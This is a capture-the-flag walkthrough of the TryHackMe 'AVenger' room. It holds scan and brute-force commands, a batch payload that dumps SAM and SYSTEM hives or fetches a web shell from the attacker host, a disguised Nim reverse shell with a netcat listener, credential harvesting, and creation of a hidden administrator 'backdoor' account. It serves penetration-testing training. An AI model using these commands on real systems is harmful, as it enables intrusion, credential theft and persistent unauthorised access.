# AVenger

**Room Link:** [https://tryhackme.com/r/room/avenger](https://tryhackme.com/r/room/avenger)

**Scans**

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (978).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (984).png" alt=""><figcaption></figcaption></figure>



### **TCP/80 - HTTP** <a href="#tcp-80-http" id="tcp-80-http"></a>

**Find Pages**

There were too many 404 and 403 in the scan so I changed to ffuf to ignore them.

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

**Kali**

```
ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404,403 -e .php,.html,.txt
```

<figure><img src="../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>





The gift folder takes us to avenger.tryhackme

<figure><img src="../../.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>



**Add hostname to host file**

**Kali**

```
echo $VICTIM avenger.tryhackme  >> /etc/hosts
cat /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (983).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ffuf -u http://avenger.tryhackme/gift/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404,403 -e .php,.html,.txt
```



**Kali**

```
 wpscan --url http://avenger.tryhackme/gift --enumerate p
```

<figure><img src="../../.gitbook/assets/image (987).png" alt=""><figcaption></figcaption></figure>

**Bruteforce admin page**

**Kali**

```
wpscan --url http://avenger.tryhackme/gift --passwords /usr/share/wordlists/rockyou.txt
```



## Initial Shell

<figure><img src="../../.gitbook/assets/image (988).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
git clone https://github.com/flozz/p0wny-shell.git
cd p0wny-shell/ 
subl exploit.bat
```

**exploit.bat**

<pre><code><strong>@echo off
</strong>
:: Check if the current user is NT AUTHORITY\SYSTEM
whoami /groups | find "S-1-5-18" > nul

if %errorlevel% equ 0 (
    :: Run commands for NT AUTHORITY\SYSTEM
    reg.exe save HKLM\SYSTEM C:\xampp\htdocs\system.bak
    reg.exe save HKLM\SAM C:\xampp\htdocs\sam.bak
) else (
    :: Run commands for other users
    curl http://$KALI:82/shell.php -o C:\xampp\htdocs\shell.php
)
</code></pre>

I tried bypassing the file type restriction with the shell above, I could see the bat file running by seeing that it try to grab the shell.php file but I couldn't find a place to save the file where I could also see it on the website.

**Kali**

```
python2 -m SimpleHTTPServer 82
```

<figure><img src="../../.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>

Nim reverse shell worked because they accept exe files&#x20;

**Kali**

<pre><code>git clone https://github.com/Sn1r/Nim-Reverse-Shell.git
cd Nim-Reverse-Shell/
<strong>apt install mingw-w64 -y
</strong></code></pre>

**Kali**

```
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
```

**Kali**

```
subl rev_shell.nim
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali #1**

```
/root/.nimble/bin/nim c -d:mingw  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
```

<figure><img src="../../.gitbook/assets/image (993).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (994).png" alt=""><figcaption></figcaption></figure>

**Kali #2**

```
rlwrap nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Privilege Esclation**&#x20;

Found some credentials.

**Victim**

```
type C:\xampp\htdocs\gift\wp-config.php
```

<figure><img src="../../.gitbook/assets/image (995).png" alt=""><figcaption></figcaption></figure>

From my computer I could access the mysql.

**Kali**

```
apt install mysql-client-core-5.7   
mysql -h$VICTIM -ugift -pSurpriseMF
```

I was able to find a password but couldn't crack it&#x20;

**Kali(mysql)**

```
select * from mysql -h$VICTIM -ugift -pSurpriseMF
use gift;
show tables;
select * from wp_users;
```

<figure><img src="../../.gitbook/assets/image (992).png" alt=""><figcaption></figcaption></figure>

I found a password

**Victim**

```
reg query HKLM /f password /t REG_SZ /s
```

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
remmina
Username: hugo
Password: SurpriseMF123!
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I can run a administrator shell from the GUI

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
net user backdoor pass!123 /add
net localgroup Administrators "Remote Desktop Users"  backdoor /add
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f
```



**Kali**

```
remmina
Username: backdoor 
Password: pass!123
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
